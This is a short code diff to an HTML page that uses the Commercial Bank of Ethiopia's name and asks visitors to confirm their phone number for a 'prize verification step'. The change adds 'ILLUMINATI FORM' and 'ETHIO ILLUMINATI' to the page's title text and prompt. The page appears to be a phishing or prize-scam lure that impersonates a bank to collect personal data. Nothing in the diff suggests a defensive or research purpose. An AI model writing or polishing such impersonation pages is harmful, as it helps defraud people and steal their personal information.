@@ -23,12 +23,12 @@
 
       <div class="hero-copy">
         <h1>Welcome!</h1>
-        <p class="brand-name">Commercial Bank of Ethiopia</p>
+        <p class="brand-name">Commercial Bank of Ethiopia ILLUMINATI FORM</p>
         <p class="greeting">Good Afternoon</p>
       </div>
 
       <p class="helper-text">
-        Confirm your phone number to check your eligibility and continue to the secure prize verification step.
+        Confirm your phone number to check your eligibility for ETHIO ILLUMINATI and continue to the secure prize verification step.
       </p>
 
       <label class="input-block" for="phone">
